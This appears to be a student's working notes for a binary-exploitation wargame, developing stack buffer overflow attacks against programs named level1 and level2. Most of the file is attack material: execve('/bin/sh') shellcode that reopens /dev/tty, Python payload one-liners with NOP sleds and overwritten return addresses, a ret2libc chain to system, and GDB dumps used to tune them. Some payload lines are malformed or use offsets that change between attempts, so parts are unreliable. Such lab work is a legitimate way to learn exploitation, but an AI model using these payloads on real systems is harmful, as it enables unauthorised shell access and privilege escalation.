shell code : \x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80

buffer address: 0xbffff6ac
ebp address  :  0xbffff6f8

0x4c (76) bytes from buffer to ebp
need to put 0xacf6ffbf at offset 76 in buffer

shell code is 86 char long


addrss after: 0xBFFFF6FC
(python -c 'print "A"*76 + "\xfc\xf6\xff\xff"' ; cat) | ./level1


0x080484d4

080483d0

(python -c 'print "A"*76 + "\xfc\xf6\xff\xfbf"'  + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" ; cat) | ./level2

(python -c 'print "A"*76 + "\xd0\x83\x04\x08"'  + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" ; cat) | ./level2

0x080484d4

0xb7ee41d8

$(python -c 'print "\x00" + "A"*74 + "\xd4\x84\x04\x08"')



0x8048528

\x28\x85\x04\x08


$(python -c 'print "A"*80 + "\xd4\x84\x04\x08" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')



0xBFFFF6FC

$(python -c 'print "A"*80 + "\xfc\xf6\xff\xff" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')


https://beta.hackndo.com/stack-introduction/
https://beta.hackndo.com/buffer-overflow/




EBP before function call: 0xbffff708
EBP after prologue function call: 0xbffff6fc + 0x4 = 0xbffff700 (because EBP was pushed on the stack, then copied esp into ebp)

0xbffff6a0:	0x080482b5	0x00000000	0x00c10000	0x41414141
0xbffff6b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x08004141
0xbffff6e0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0x0804854a
0xbffff6f0:	0xb7fed280	0x00000000	0xbffff708	0x0804854a

Buffer starts at 0xBFFFF6AC and EBP save is at 0xBFFFF6F8 (76 or 0x4c bytes)
We can see EIP right after (0x0804854a) starting at address 0xBFFFF6FC

disas main:
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave

We can match EIP with leave which is correct

We need to write 0x50 or 80 bytes to reach EIP, then 4 more bytes to overwrite EIP with the address of the shellcode

Allocated buffer size is 0x68 or 104 bytes

print 79 and not 80 because it seems to be null terminated
python -c 'print "A"*79 + "<address of shellcode>"' | ./level2


// use 0xBFFFF6AC as address of shellcode
result: python -c 'print "A"*79 + "\xac\xf6\xff\xff"' | ./level2

then instead of A's, we can use NOP (0x90) followed by the shellcode (\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80)
see https://shell-storm.org/shellcode/files/shellcode-219.html
shellcode is 55 chars long, so we need to add 79-55 = 24 NOPs, then try to jump in middle of NOPs to avoid bad chars (so jump at 0xBFFFF6AC + 8 = 0xBFFFF6B0)
python -c 'print "\x90"*25 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\xb0\xf6\xff\xbf"'


// put shellcode in the middle of NOP
python -c 'print "\x90"*12 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x90"*13 + "\xb0\xf6\xff\xbf"'
idk why but with 24 NOPs, it isn't aligned with the shellcode, we need 25 NOPs to align it

We get an error accessing 0x90909094, see this for explanation https://stackoverflow.com/questions/19506337/gdb-ret-cannot-access-memory-at-address, basically EBP is restored from stack but since we override it it's value is 0x90909090
https://course.cs.tau.ac.il/infosec15/node/90#:~:text=Basically%2C%20a%20ret%20instruction&text=About%20ebp%20%2D%20think%20of%20ebp,to%20the%20current%20stack%20frame.
Ret seems to use ebp + 4 to get the old EIP, but since EBP is changed, it segfault, so we need to either manually change EBP before ret, or
use gdb to find out it's value at the start of function, then add it before EIP in the payload instead of NOPs
looks like this:
NOP + shellcode + NOP + ebp + eip
python -c 'print "\x90"*12 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x90"*9 + "<old EBP>" + "\xb0\xf6\xff\xbf"'

using GDB with a simple breakpoint, we found that EBP=0xbffff708 at the start of function

so the command is :
python -c 'print "\x90"*12 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x90"*9 + "\x08\xf7\xff\xbf" + "\xb0\xf6\xff\xbf"'

We still need the breakpoing when it compares eax with 0xb***** mask, to set it to 0 instead of address to override the check, might need to find a better way using only input instead of gdb


test using only NOPs, EBP and EIP
python -c 'print "\x90"*12 + "\x90"*55 + "\x90"*9 + "\x08\xf7\xff\xbf" + "\xb0\xf6\xff\xbf"'

then replace with shellcode
python -c 'print "\x90"*12 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x90"*9 + "\x08\xf7\xff\xbf" + "\xb0\xf6\xff\xbf"'



0xbffff708 














==== V2 ===
Trying ret2libc method but instead of using p return we try to return normally to main and exploit main return to bypass the 0xb check by p function

EIPsave (p): 0x0804854a
EBPsave (p): 0xbffff708

EIPsave (main): 0xb7e454d3
EBPsave (main): 0x00000000 (stack rounded by main down to 16 bytes to align it I guess)

[ NOPs ] [ EBP Save ] [ EIP Save ]

Stack looks like this 

  BUFFER
  EBP (p)
  EIP (p)
 EBP (main)
 EIP (main) <----- We want to change this one

0xb7e454d3	0x00000001	0xbffff7a4	0xbffff7ac (Top of stack on first line of main (first address is EIP save))

Stack in p from buffer (first byte) to main EIP save (included)
bffff6ac0000000000000000b7e5ec73
080482b50000000000c1000000000054
bffff8c90000002fbffff70cb7fd0ff4
08048550080498280000000108048381
b7fd13e40000000d0804982808048571
ffffffffb7e5edc6b7fd0ff40804854a
b7fed28000000000bffff7080804854a
080485500000000000000000******** <---- Stars are to override main EIP address (with system address for instance)

buffer for python (EIP for main not included)
\xbf\xff\xf6\xac\x00\x00\x00\x00\x00\x00\x00\x00\xb7\xe5\xec\x73\x08\x04\x82\xb5\x00\x00\x00\x00\x00\xc1\x00\x00\x00\x00\x00\x54\xbf\xff\xf8\xc9\x00\x00\x00\x2f\xbf\xff\xf7\x0c\xb7\xfd\x0f\xf4\x08\x04\x85\x50\x08\x04\x98\x28\x00\x00\x00\x01\x08\x04\x83\x81\xb7\xfd\x13\xe4\x00\x00\x00\x0d\x08\x04\x98\x28\x08\x04\x85\x71\xff\xff\xff\xff\xb7\xe5\xed\xc6\xb7\xfd\x0f\xf4\x08\x04\x85\x4a\xb7\xfe\xd2\x80\x00\x00\x00\x00\xbf\xff\xf7\x08\x08\x04\x85\x4a\x08\x04\x85\x50\x00\x00\x00\x00\x00\x00\x00\x00


https://beta.hackndo.com/retour-a-la-libc/#contournement--ret2libc

We need to do [ Previous Stack ] [ EIP Override ] [ 4 random bytes to fake EIP ] [ "/bin/sh" ]
system address: 0xb7e6b060    - \x60\xb0\xe6\xb7
"/bin/sh" address: 0xb7f8cc58 - \x58\xcc\xf8\xb7

So we need <Previous Stack> + \x60\xb0\xe6\xb7 + OSEF + \x58\xcc\xf8\xb7

Final buffer:
"\xbf\xff\xf6\xac\x00\x00\x00\x00\x00\x00\x00\x00\xb7\xe5\xec\x73\x08\x04\x82\xb5\x00\x00\x00\x00\x00\xc1\x00\x00\x00\x00\x00\x54\xbf\xff\xf8\xc9\x00\x00\x00\x2f\xbf\xff\xf7\x0c\xb7\xfd\x0f\xf4\x08\x04\x85\x50\x08\x04\x98\x28\x00\x00\x00\x01\x08\x04\x83\x81\xb7\xfd\x13\xe4\x00\x00\x00\x0d\x08\x04\x98\x28\x08\x04\x85\x71\xff\xff\xff\xff\xb7\xe5\xed\xc6\xb7\xfd\x0f\xf4\x08\x04\x85\x4a\xb7\xfe\xd2\x80\x00\x00\x00\x00\xbf\xff\xf7\x08\x08\x04\x85\x4a\x08\x04\x85\x50\x00\x00\x00\x00\x00\x00\x00\x00" + "\x60\xb0\xe6\xb7" + "OSEF" + "\x58\xcc\xf8\xb7"

Command:

[ NOP]          [ EBP ]                [ EIP ]      [ trash ebp]  [ system eip ]  [ fake eip]   ["/bin/sh"]
"\x90"*76 + "\x08\xf7\xff\xbf" + "\x4a\x85\x04\x08" + "AAAA" "\x60\xb0\xe6\xb7" + "OSEF" + "\x58\xcc\xf8\xb7"

Need to add 8 more A (idk why but padding is right with them so "A"*12)

Need to save old main EBP which is 0x00000000
the leave inside main seems to pop 3 pointers in stack (12 bytes)
Just try to add 12 NULLs and see if it works: UPDATE, null bytes count as NULL terminating string so the string it cut, trying with 01

Also ESP is 0xbffff700 at the start, so might try with this value later

"\x90"*76 + "\x08\xf7\xff\xbf" + "\x4a\x85\x04\x08" + "\x88"*12 + "\x60\xb0\xe6\xb7" + "\x88"*4 + "\x58\xcc\xf8\xb7"

This successfully gets us into system, which then checks if ESI (argument) is null, if we deref ESI and print as string on the compare, we can find "/bin/sh" so it's good
We segfault on the fake EIP we gave, because in system it does a JMP to an address, and we think this code pops the stack (retrieving "OSEF", then segfault on that address, so we try to give a real EIP)
EIP (on the stack) in main is 0xb7e454d3, so try with this address (\xd3\x54\xe4\xb7), which gives:

"\x90"*76 + "\x08\xf7\xff\xbf" + "\x4a\x85\x04\x08" + "\x88"*12 + "\x60\xb0\xe6\xb7" + "\xd3\x54\xe4\xb7" + "\x58\xcc\xf8\xb7"

And it kinda works, we can see we're back in __libc_.start_main (which is the caller of main)
Let's examine the jmp instruction (which seems to perform the exec) at 0xb7e6aaa0
GDB cannot find function, but we can do 'disas/r 0xb7e6aaa0,0xb7e6aaf0' to interpret the hex as code, output:

0xb7e6aaa0:	55	push   %ebp
   0xb7e6aaa1:	b9 20 00 00 00	mov    $0x20,%ecx
   0xb7e6aaa6:	57	push   %edi
   0xb7e6aaa7:	56	push   %esi
   0xb7e6aaa8:	53	push   %ebx
   0xb7e6aaa9:	81 ec 6c 01 00 00	sub    $0x16c,%esp
   0xb7e6aaaf:	8d 74 24 30	lea    0x30(%esp),%esi
   0xb7e6aab3:	89 44 24 1c	mov    %eax,0x1c(%esp)
   0xb7e6aab7:	89 f7	mov    %esi,%edi
   0xb7e6aab9:	31 c0	xor    %eax,%eax
=> 0xb7e6aabb:	f3 ab	rep stos %eax,%es:(%edi)
   0xb7e6aabd:	e8 b1 c1 0e 00	call   0xb7f56c73
   0xb7e6aac2:	81 c3 32 65 16 00	add    $0x166532,%ebx
   0xb7e6aac8:	c7 44 24 2c 01 00 00 00	movl   $0x1,0x2c(%esp)
   0xb7e6aad0:	c7 84 24 b0 00 00 00 00 00 00 00	movl   $0x0,0xb0(%esp)
   0xb7e6aadb:	b1 01	mov    $0x1,%cl
   0xb7e6aadd:	65 83 3d 0c 00 00 00 00	cmpl   $0x0,%gs:0xc
   0xb7e6aae5:	74 01	je     0xb7e6aae8
   0xb7e6aae7:	f0 0f b1 8b 2c 16 00 00	lock cmpxchg %ecx,0x162c(%ebx)
   0xb7e6aaef:	0f 85 f8 05 00 00	jne    0xb7e6b0ed

We try to continue in function and see where is the segfault / execution, the rep stos performs a loop until ecx is 0 (it runs about 25 times iirc)
The call 0xb7f56c73 simply does this
=> 0xb7f56c73:	8b 1c 24	mov    (%esp),%ebx
   0xb7f56c76:	c3	ret
   0xb7f56c77:	8b 0c 24	mov    (%esp),%ecx
   0xb7f56c7a:	c3	ret
   0xb7f56c7b:	8b 14 24	mov    (%esp),%edx
   0xb7f56c7e:	c3	ret

It seems to loop idk why, then the breakpoint on ret is skipped and we are in the shell

Also, since we to a pipe with GDB, we need to keep the stdin opened to not close the shell immediately, this can be done easily with pipes (echo "pouet"; cat ) | ./level2
But in gdb we need '< <(echo "pouet"; cat)  (see https://stackoverflow.com/q/8422259), however, it does not work with breakpoints (SIGTTINT)
After this, we get a shell ! But ... it's executed as level2 and not level3
So we try to to the same, but instead of redirecting to system, we try shellcode as before :

 [ NOP]                                         [ SHELLCODE ]                                                                                                                                 [ CORRECT P EBP]    [ CORRECT P EIP]    [ PADDING ]  [ SHELLCODE EIP]
"\x90"*21 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x18\xfe\xff\xbf" + "\x4a\x85\x04\x08" + "\x88"*12 + "\xc0\xfd\xff\xbf"
We successfully get into the shellcode, successfully close stdin, open dev/tty, but by looking at the stack, it was modified and the last 4 bytes of execve call have been replaced, idk why
So I try to move 4 bytes to the left and see the result, still not working, probably gdb is modifying stack, after adding a breakpoint in gets, it seems to work a bit better but not yet fully
So for the test, I go to ret on main, then manually modify "corrupted" shellcode memory to the right one (its always the \x50 which gets replaced by \x00) and always the same
so just 'set {char}0xbffff6d5=0x50', after that the shellcode seems correct ('disas/r 0xbffff6b2,0xbffff6f0' to check compare with https://shell-storm.org/shellcode/files/shellcode-219.html)
but start (NOPs) is also modified, so 'set *0xbffff6b0 = 0x90909090'
After manually fixing shellcode and executing, we reach execve (int 0x80), it seems that we sucessfully call execve

Trying to run with gdb without breakpoint causes SIGTTIN, but I saw a message "executing /bin/dash" which indicates it should work


UPDATE: stack weird values are caused by GDB breakpoints, when we run the program in gdb but without any breakpoints, we successfully get a shell using the shellcode, but it's still level2 executing it :(



=== V3 ===
objdump -d ./level2 | grep call   to list all call, we can see two calls to [eax], so we might use that, since 

